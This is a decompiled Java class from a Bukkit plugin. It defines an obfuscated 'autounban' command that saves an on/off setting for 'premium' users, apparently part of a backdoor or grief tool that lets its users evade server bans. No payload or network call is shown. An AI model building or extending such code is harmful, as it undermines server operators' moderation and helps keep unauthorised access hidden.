/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class AutounbanCommand
extends Command {
    public static /* synthetic */ Boolean autounban;

    static {
        autounban = false;
    }

    @Override
    public boolean isBlatant() {
        return false;
    }

    public AutounbanCommand() {
        AutounbanCommand lllllllllllllIlIlIIlllllIllllIlI;
    }

    @Override
    public void execute(Core lllllllllllllIlIlIIlllllIlllIlIl, String lllllllllllllIlIlIIlllllIlllIlII, String[] lllllllllllllIlIlIIlllllIlllIIll, Player lllllllllllllIlIlIIlllllIlllIIII) {
        if (lllllllllllllIlIlIIlllllIlllIlIl.premium.contains(lllllllllllllIlIlIIlllllIlllIIII.getName())) {
            if (DataManager.getData().getBoolean("autounban")) {
                autounban = false;
                DataManager.getData().set("autounban", (Object)false);
                DataManager.saveData();
                lllllllllllllIlIlIIlllllIlllIIII.sendMessage(Settings.PREFIX("auto unban is now disabled."));
            } else {
                autounban = true;
                DataManager.getData().set("autounban", (Object)true);
                DataManager.saveData();
                lllllllllllllIlIlIIlllllIlllIIII.sendMessage(Settings.PREFIX("auto unban is now enabled!"));
            }
        } else {
            lllllllllllllIlIlIIlllllIlllIIII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be an ").append(Settings.RED).append("premium ").append(Settings.WHITE).append("to execute this command"))));
        }
    }
}

